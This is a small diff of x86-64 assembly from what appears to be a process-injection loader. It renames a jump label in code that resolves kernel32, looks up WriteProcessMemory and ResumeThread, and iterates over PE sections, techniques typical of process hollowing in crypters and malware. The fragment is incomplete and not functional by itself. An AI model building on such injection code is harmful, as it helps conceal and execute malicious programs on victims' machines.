@@ -638,8 +638,8 @@ section deccode
             mov [rel address750], rax
             mov [rel NumSection], dword 0x00
             jmp Final
-        Delta:
-			add rsp, 0x10
+        Realoc:
+	    add rsp, 0x10
 			
             call Locate_kernel32
             ;Lookup WriteProcess
@@ -851,7 +851,7 @@ section deccode
         movzx eax, word[rax+0x06]
         movzx eax, ax
         cmp eax, [rel NumSection]   
-        jg Delta
+        jg Realoc
 		
         call Locate_kernel32 
         ;Lookup ResumeTheread
